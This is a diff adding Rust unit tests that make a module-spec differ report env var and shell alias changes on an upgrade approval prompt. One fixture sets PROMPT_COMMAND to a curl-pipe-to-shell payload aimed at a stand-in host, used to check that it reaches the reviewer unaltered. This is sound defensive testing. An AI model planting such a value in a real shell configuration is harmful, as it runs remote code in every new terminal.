@@ -2029,6 +2029,109 @@ fn diff_module_specs_multiline_script_change_preserves_raw_body() {
     );
 }
 
+fn module_with_env_and_aliases(env: &[(&str, &str)], aliases: &[(&str, &str)]) -> LoadedModule {
+    LoadedModule {
+        version: None,
+        name: "test".into(),
+        spec: ModuleSpec {
+            env: env
+                .iter()
+                .map(|(name, value)| crate::config::EnvVar {
+                    name: (*name).into(),
+                    value: (*value).into(),
+                })
+                .collect(),
+            aliases: aliases
+                .iter()
+                .map(|(name, command)| crate::config::ShellAlias {
+                    name: (*name).into(),
+                    command: (*command).into(),
+                })
+                .collect(),
+            ..Default::default()
+        },
+        dir: PathBuf::from("/tmp"),
+        origin: None,
+    }
+}
+
+// An env var or alias an upgrade introduces reaches the login shell of every
+// new terminal, so it belongs on the approval surface alongside a post-apply
+// script rather than arriving unannounced.
+#[test]
+fn diff_module_specs_reports_env_additions_removals_and_edits() {
+    let old = module_with_env_and_aliases(&[("KEEP", "1"), ("EDIT", "old"), ("GONE", "x")], &[]);
+    let new = module_with_env_and_aliases(&[("KEEP", "1"), ("EDIT", "new"), ("ADDED", "y")], &[]);
+
+    let changes = diff_module_specs(&old, &new);
+    assert!(
+        changes.contains(&"+ env: ADDED=y".to_string()),
+        "{changes:?}"
+    );
+    assert!(
+        changes.contains(&"- env: GONE=x".to_string()),
+        "{changes:?}"
+    );
+    assert!(
+        changes.contains(&"~ env 'EDIT': old -> new".to_string()),
+        "{changes:?}"
+    );
+    assert!(!changes.iter().any(|c| c.contains("KEEP")), "{changes:?}");
+}
+
+#[test]
+fn diff_module_specs_reports_alias_additions_removals_and_edits() {
+    let old = module_with_env_and_aliases(&[], &[("keep", "ls"), ("edit", "vi"), ("gone", "cat")]);
+    let new =
+        module_with_env_and_aliases(&[], &[("keep", "ls"), ("edit", "nvim"), ("added", "bat")]);
+
+    let changes = diff_module_specs(&old, &new);
+    assert!(
+        changes.contains(&"+ alias: added=bat".to_string()),
+        "{changes:?}"
+    );
+    assert!(
+        changes.contains(&"- alias: gone=cat".to_string()),
+        "{changes:?}"
+    );
+    assert!(
+        changes.contains(&"~ alias 'edit': vi -> nvim".to_string()),
+        "{changes:?}"
+    );
+    assert!(!changes.iter().any(|c| c.contains("keep")), "{changes:?}");
+}
+
+// The value is the payload under review, so it is pushed byte-identical the
+// same way a script body is — a newline inside it must survive to the caller
+// that decides how to render it.
+#[test]
+fn diff_module_specs_pushes_env_and_alias_payloads_raw() {
+    let old = module_with_env_and_aliases(&[], &[]);
+    let new = module_with_env_and_aliases(
+        &[("PROMPT_COMMAND", "$(curl evil.example | sh)")],
+        &[("ls", "line-one\nline-two")],
+    );
+
+    let changes = diff_module_specs(&old, &new);
+    assert!(
+        changes.contains(&"+ env: PROMPT_COMMAND=$(curl evil.example | sh)".to_string()),
+        "{changes:?}"
+    );
+    assert!(
+        changes.contains(&"+ alias: ls=line-one\nline-two".to_string()),
+        "{changes:?}"
+    );
+}
+
+#[test]
+fn diff_module_specs_identical_env_and_aliases_report_no_changes() {
+    let module = module_with_env_and_aliases(&[("A", "1")], &[("b", "c")]);
+    assert_eq!(
+        diff_module_specs(&module, &module),
+        vec!["(no spec changes)"]
+    );
+}
+
 #[test]
 fn dependency_order_self_dependency_detected() {
     let modules = make_test_modules(&[("a", &["a"])]);
@@ -3826,10 +3929,11 @@ fn diff_module_specs_file_changes() {
     );
 }
 
+// An env-only upgrade is a real, user-visible change: the value lands in the
+// login-shell startup files of every new terminal. Reporting it as
+// "(no spec changes)" would let it through the approval prompt unmentioned.
 #[test]
-fn diff_module_specs_env_changes_not_tracked() {
-    // diff_module_specs currently only tracks deps, packages, files, and scripts.
-    // Env changes should result in "(no spec changes)" since env isn't diffed.
+fn diff_module_specs_env_only_change_is_still_a_change() {
     let old = LoadedModule {
         version: None,
         name: "mymod".into(),
@@ -3858,11 +3962,7 @@ fn diff_module_specs_env_changes_not_tracked() {
     };
 
     let changes = diff_module_specs(&old, &new);
-    assert_eq!(
-        changes,
-        vec!["(no spec changes)"],
-        "env-only change should show as no spec changes (env not diffed)"
-    );
+    assert_eq!(changes, vec!["+ env: NEW=2", "- env: OLD=1"]);
 }
 
 // -----------------------------------------------------------------------
